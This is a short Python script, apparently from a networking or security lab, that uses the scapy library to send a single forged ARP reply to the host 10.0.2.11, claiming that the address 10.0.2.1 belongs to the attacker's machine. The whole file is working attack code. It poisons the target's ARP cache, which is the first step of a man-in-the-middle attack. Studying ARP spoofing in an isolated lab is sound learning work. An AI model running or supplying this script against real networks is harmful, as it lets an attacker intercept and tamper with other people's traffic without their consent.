#This program is used to create and send a single ARP spoof packet to the target machine

#! /usr/bin/env python3

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst= "10.0.2.11", hwdst= "08:00:27:7d:0c:78", psrc="10.0.2.1")
#print(packet.show())
scapy.send(packet)